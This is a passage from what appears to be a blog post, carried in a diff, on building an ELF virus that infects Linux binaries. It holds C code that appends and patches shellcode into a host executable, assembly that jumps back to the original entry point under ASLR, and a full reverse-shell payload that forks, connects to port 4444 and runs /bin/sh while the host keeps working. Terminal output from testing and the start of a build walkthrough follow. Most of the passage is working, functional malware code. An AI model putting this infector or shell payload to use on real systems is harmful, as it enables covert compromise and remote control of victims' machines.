+</span></span><span class="line"><span class="cl"><span class="nf">patch</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode_len</span><span class="p">,</span> <span class="n">memory_offset</span><span class="p">,</span> <span class="n">original_entry</span><span class="p">);</span>
+</span></span></code></pre></div><p>The array is the shellcode of a small assembly program. And all we&rsquo;re doing is patching in the bytes so that when it runs, it does so using the values we&rsquo;ve provided.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Patch in shellcode from jumpstart.s to resolve start_offset
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">patch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">**</span><span class="n">shellcode</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">shellcode_len</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">entry_point</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_offset</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">jump_shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc3</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Write values using little-endian ordering
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">write_u64_le</span><span class="p">(</span><span class="o">&amp;</span><span class="n">jump_shellcode</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="o">*</span><span class="n">shellcode_len</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write_u64_le</span><span class="p">(</span><span class="o">&amp;</span><span class="n">jump_shellcode</span><span class="p">[</span><span class="mi">17</span><span class="p">],</span> <span class="n">entry_point</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write_u64_le</span><span class="p">(</span><span class="o">&amp;</span><span class="n">jump_shellcode</span><span class="p">[</span><span class="mi">27</span><span class="p">],</span> <span class="n">start_offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Extend shellcode vector by appending the jump_shellcode size;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Realloc new size, memcpy jump_shellcode into new_shellcode
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">size_t</span> <span class="n">new_len</span> <span class="o">=</span> <span class="o">*</span><span class="n">shellcode_len</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">jump_shellcode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">new_shellcode</span> <span class="o">=</span> <span class="nf">realloc</span><span class="p">(</span><span class="o">*</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">new_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">new_shellcode</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error reallocating shellcode buffer</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="n">shellcode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">new_shellcode</span> <span class="o">+</span> <span class="o">*</span><span class="n">shellcode_len</span><span class="p">,</span> <span class="n">jump_shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">jump_shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">new_shellcode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">shellcode_len</span> <span class="o">=</span> <span class="n">new_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The source code of the array is this trick from an old e-zine. It takes our virus size, new entry, and original start_offset and uses a bit of math to find out where its relative addressing. Each time a modern binary runs, ASLR and position-independent executables have their addresses semi-randomized.</p>
+<p>What our assembly program does here is provide some quasi-random seeds in the form of <code>defined</code> constants. When our array gets patched, it tells it to run this assembly program using the values that have been patched into it.</p>
+<p>The randomness of our constants means that when the patch happens, the addresses are guaranteed to be unique. Where our shellcode ends, this <code>jump_shellcode.s</code> program begins. We first call <code>get_foo</code> and store the stack pointer and store it in <code>rax</code>. We then move our constants to registers <code>r9</code>, <code>r10</code>, and <code>r11</code>.</p>
+<p>Then we do the following trick: we substract the size of our malware <code>VSIZE</code> from the stack pointer in <code>rax</code>. Then we subtract <code>5</code> to accomadte for the size of the <code>get_foo</code> instruction itself. Then we subtract the patched <code>entry</code> offset.</p>
+<p>And last, we add the original entry <code>start</code> offset to <code>rax</code> Now we can jump back to the original entry point, every time, even though the executable is position independent.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">BITS</span> <span class="mi">64</span>
+</span></span><span class="line"><span class="cl"><span class="err">%</span><span class="nf">define</span> <span class="no">VSIZE</span> <span class="mi">0xDEADBEEFDEADBEEF</span>   
+</span></span><span class="line"><span class="cl"><span class="nv">%define</span> <span class="no">ENTRY</span> <span class="mi">0xBAADF00DBAADF00D</span>
+</span></span><span class="line"><span class="cl"><span class="err">%</span><span class="nf">define</span> <span class="no">START</span> <span class="mi">0xB16B00B5B16B00B5</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">; - position independent executables move addresses, so
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">; 1) call to get_foo instruction pointer into rax then 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">; 2) load our constants into registers r9, r10, r11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">; 3) sub that address from our malware size minus 5! 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">;   *(the size of the get_foo instruction)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">; 4) sub rax from entry to get the new relative
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">;    entry address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">; 5) add the difference with rax and r11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">;   *(r11, the original e_hdr.entry)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">; 6) finally jmp to rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">call</span> <span class="no">get_foo</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">r9</span><span class="p">,</span> <span class="no">VSIZE</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">r10</span><span class="p">,</span> <span class="no">ENTRY</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">r11</span><span class="p">,</span> <span class="no">START</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="no">rax</span><span class="p">,</span> <span class="no">r9</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="no">rax</span><span class="p">,</span> <span class="no">r10</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="no">rax</span><span class="p">,</span> <span class="no">r11</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">jmp</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl"><span class="nl">get_foo:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ret</span>
+</span></span></code></pre></div><h2 id="assembling-shellcode">Assembling Shellcode<a hidden class="anchor" aria-hidden="true" href="#assembling-shellcode">#</a></h2>
+<p>Embarrassingly, it took me a little while to get a reliable payload working. Initially, my program would segfault and I thought I messed up the infector. At another point, it would segfault while the shell would survive. And as I got closer, it would sometimes <em>almost</em> work, but still segfault.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">hexagr@vr:~/master/research$ ./ls
+</span></span><span class="line"><span class="cl">Segmentation fault (core dumped)
+</span></span><span class="line"><span class="cl">hexagr@vr:~/master/research$ ./ls
+</span></span><span class="line"><span class="cl">Segmentation fault (core dumped)
+</span></span><span class="line"><span class="cl">hexagr@vr:~/master/research$ ./ls
+</span></span><span class="line"><span class="cl">elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
+</span></span><span class="line"><span class="cl">ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
+</span></span><span class="line"><span class="cl">Segmentation fault (core dumped)
+</span></span><span class="line"><span class="cl">hexagr@vr:~/master/research$ ./ls
+</span></span><span class="line"><span class="cl">elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
+</span></span><span class="line"><span class="cl">ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
+</span></span><span class="line"><span class="cl">Segmentation fault (core dumped)
+</span></span><span class="line"><span class="cl">hexagr@vr:~/master/research$ ./ls
+</span></span><span class="line"><span class="cl">Segmentation fault (core dumped)
+</span></span><span class="line"><span class="cl">hexagr@vr:~/master/research$ ./ls
+</span></span><span class="line"><span class="cl">elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
+</span></span><span class="line"><span class="cl">ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
+</span></span><span class="line"><span class="cl">Segmentation fault (core dumped)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(╯°□°）╯︵ ┻━┻
+</span></span></code></pre></div><p>One issue was the way that I originally ordered the logic of the <code>fork</code>. Initially I tried to jump into the <code>fork</code> and I messed up the logical order of things. Then I realized that you could just spawn it and return to the parent process prettty easily.</p>
+<p>The other issues were with <code>ret</code> sometimes messing up the stack alignment. If you can call <code>ret</code> at the end when returning to the parent process, it messes up the stack.</p>
+<p>Eventually, I realized that the answer to all of this was a lot more straight forward and that my approach to using <code>fork</code> to spawn a process in the background could be improved, and that the stack could in fact be preserved and restored in a reliable way.</p>
+<p>After a bit of trial and error &ndash; and correctly returning the stack pointer, the shellcode seems reliable now. In the end, the successful assembly code I ended up creating goes something like this:</p>
+<p>First, we try to preserve the behavior of the infected host binary by saving all of the registers by pushing them to the stack, along with the stack pointer.</p>
+<p>Only then do we try to call the <code>fork</code> syscall. The <code>child_process</code> then spawns off where it prepares its networking code.</p>
+<p>Inside the forked <code>child_process</code>, we prepare to use the <code>connect</code> syscall by setting up the <code>AF_INET</code>, <code>SOCK_STREAM</code>, and <code>IPPROTOC_TCP</code> arguments.</p>
+<p>If the socket setup fails, our <code>child_process</code> &ndash; now separated from the parent &ndash; fails silently. Otherwise, we likely have a good file descriptor and so we move it to <code>rdi</code>.</p>
+<p>Continuing, we <code>xor</code> the <code>rdx</code> register clearing it before pushing it to the stack as a <code>NULL</code> pad, before pushing the address we want to connect to. Here, we just use localhost, <code>127.0.0.1</code>, and our chosen port <code>4444</code>.</p>
+<p>We push the AF_INET (address family) <code>2</code>, then move the stack pointer to <code>rsi</code> for the <code>sockaddr</code> pointer and set it to its correct structure size of 16 bytes.</p>
+<p>We make the syscall and if it fails, we exit. Otherwise, we setup to duplicate the file descriptor with <code>dup2</code> and move on to execute our shell.</p>
+<blockquote>
+<p><em>dup2 doesn&rsquo;t switch the file descriptors, it makes them equivalent. After dup2(f1, 0), whatever file was opened on descriptor f1 is now also opened (with the same mode and position) on descriptor 0, i.e. on standard input.</em></p></blockquote>
+<blockquote>
+<p><em>If the target file descriptor was open, it is closed by the dup2 call. This is useful (among other things) when you have part of a program that reads or write from the standard file descriptors. For example, suppose that somefunc() reads from standard input, but you want it to read from a different file from where the rest of the program is getting its standard input. Then you can do (error checking omitted):</em></p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">save_stdin</span> <span class="o">=</span> <span class="nf">dup</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">somefunc_input_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;input-for-somefunc.data&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">dup2</span><span class="p">(</span><span class="n">somefunc_input_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* Now the original stdin is open on save_stdin, and input-for-somefunc.data on 
+</span></span></span><span class="line"><span class="cl"><span class="cm">both somefunc_input_fd and 0. */</span>
+</span></span><span class="line"><span class="cl"><span class="nf">somefunc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nf">close</span><span class="p">(</span><span class="n">somefunc_input_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">dup2</span><span class="p">(</span><span class="n">save_stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">close</span><span class="p">(</span><span class="n">save_stdin</span><span class="p">);</span>
+</span></span></code></pre></div><p>This insight brought to you by netizen <em><strong>Gilles &lsquo;SO- stop being evil&rsquo;, StackOverflow</strong></em></p>
+<p><code>Dup2</code> lets us duplicate the file descriptor to handle <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> pipes. After we decrement through the loop, we can use them with a shell.</p>
+<p>So we build the <code>/bin/sh</code> pathname array and move it to <code>rbx</code>, followed by the <em>path</em> to the <em>argument</em> of the <em>pathname</em>!</p>
+<p>Our final code looks like this, with <code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</code>. If all goes well, we receive a shell on our listener and the original behavior of our infected host program is preserved.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">BITS</span> <span class="mi">64</span>
+</span></span><span class="line"><span class="cl"><span class="nf">global</span> <span class="no">_start</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">section</span> <span class="no">.text</span>
+</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
+</span></span><span class="line"><span class="cl">                                <span class="c1">; save original stack pointer 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">r12</span><span class="p">,</span> <span class="no">rsp</span>                <span class="c1">; preserve rsp in r12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                                <span class="c1">; save all registers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">push</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rcx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rsi</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">r8</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">r9</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">r10</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">r11</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="c1">; fork to isolate shellcode execution
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">57</span>                 <span class="c1">; sys_fork
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">test</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">jnz</span> <span class="no">parent</span>                  <span class="c1">; parent continues host execution
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nl">child_process:</span>
+</span></span><span class="line"><span class="cl">                                <span class="c1">; socket syscall
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="c1">; int socket(int domain, int type, int protocol)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">41</span>                 <span class="c1">; sys_socket
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="mi">2</span>                  <span class="c1">; AF_INET
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">1</span>                  <span class="c1">; SOCK_STREAM
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">6</span>                  <span class="c1">; IPPROTO_TCP
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">cmp</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">jl</span> <span class="no">exit</span>                     <span class="c1">; if socket fails, exit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                                <span class="c1">; save socket file descriptor in rdi
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="c1">; connect syscall
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="c1">; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">42</span>                 <span class="c1">; sys_connect
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="c1">; build sockaddr_in structure on the stack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rdx</span>                    <span class="c1">; null pad
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x0100007f</span>       <span class="c1">; 127.0.0.1, ip address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">push</span> <span class="no">word</span> <span class="mi">0x5c11</span>            <span class="c1">; port 4444, network byte order
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">push</span> <span class="no">word</span> <span class="mi">2</span>                 <span class="c1">; AF_INET
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>                <span class="c1">; pointer to sockaddr_in structure
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">16</span>                 <span class="c1">; size of sockaddr_in
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">cmp</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">jl</span> <span class="no">exit</span>                     <span class="c1">; if connect fails, exit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                                <span class="c1">; dup2 syscall: int dup2(int oldfd, int newfd)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">3</span>                  <span class="c1">; Start with stderr (2), work down to stdin (0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">dup2_loop:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">dec</span> <span class="no">rsi</span>                     <span class="c1">; Decrement file descriptor (2 -&gt; 1 -&gt; 0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">33</span>                 <span class="c1">; sys_dup2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">jnz</span> <span class="no">dup2_loop</span>               <span class="c1">; loop until rsi is 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                                <span class="c1">; execve syscall
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="c1">; int execve(const char *pathname, char *const argv[], char *const envp[])
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rax</span>                    <span class="c1">; NULL terminator
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rbx</span><span class="p">,</span> <span class="mi">0x68732f6e69622f2f</span> <span class="c1">; &#34;//bin/sh&#34; in reverse byte order
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">push</span> <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rsp</span>                <span class="c1">; Pathname pointer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">rax</span>                    <span class="c1">; NULL terminator for argv
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">push</span> <span class="no">rdi</span>                    <span class="c1">; pointer to the string &#34;//bin/sh&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>                <span class="c1">; argv -&gt; [pointer_to_string, NULL]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>                <span class="c1">; envp -&gt;NULL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">59</span>                  <span class="c1">; syscall, execve
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="c1">; if execve fails, exit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">exit:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">60</span>                  <span class="c1">; sys_exit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">xor</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">parent:</span>
+</span></span><span class="line"><span class="cl">                                <span class="c1">; restore registers and continue host execution
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">pop</span> <span class="no">r11</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">r10</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">r9</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">r8</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">rsi</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">rcx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pop</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rsp</span><span class="p">,</span> <span class="no">r12</span>                <span class="c1">; restore stack pointer
+</span></span></span></code></pre></div><p>The last thing we do in order to ensure our exploit runs smoothly is <code>pop</code> all of our registers back in proper reverse order to how we pushed them and move the stack pointer we saved earlier in <code>r12</code> back to <code>rsp</code>.</p>
+<h2 id="proof-of-concept">Proof of Concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">hexagr@vr:~/elf$ gcc -o elf_infector elf_infector.c
+</span></span><span class="line"><span class="cl">hexagr@vr:~/elf$ cp $(which ls) ls
+</span></span><span class="line"><span class="cl">hexagr@vr:~/elf$ nasm -o shellcode shellcode.s
